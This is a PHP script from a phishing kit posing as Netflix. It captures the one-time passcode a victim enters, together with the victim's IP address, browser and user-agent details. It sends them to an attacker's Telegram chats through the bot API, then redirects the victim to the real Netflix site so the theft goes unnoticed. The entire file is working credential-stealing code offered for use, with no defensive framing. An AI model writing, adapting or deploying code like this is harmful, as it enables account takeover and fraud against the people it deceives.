<?php

session_start();
include "../myconfig/telegram.php";
include "../myconfig/settings.php";
$ip = getenv("REMOTE_ADDR");
foreach ($IdTelegram as $chatId) {
    $message = "[=====>  NETFLIX by Alien|  OTP ❤️ <=====]\n\n";
    $message .= "[ OTP 💬:  " . $_POST["signupOtpCode"] . "\n";
    $message .= "[=====> VICTIM INFROMATIONS <=====]\n\n";
    $message .= "[ IP :    " . $ip . "\n";
    $message .= "[ OS :    " . $user_os . "\n";
    $message .= "[ Browser :    " . $user_browser . "\n";
    $message .= "[ UA :    " . $_SERVER["HTTP_USER_AGENT"] . "\n";
    $message .= "[=====>  NETFLIX by ALien|  OTP ❤️ <=====]\n\n";
    $website = "https://api.telegram.org/bot" . $botToken;
    $params = [
        "chat_id" => $chatId,
        "text" => $message,
    ];
    $ch = curl_init($website . "/sendMessage");
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
echo '<script type = "text/javascript">window.location = "https://www.netflix.com/browse";</script>';
}
?>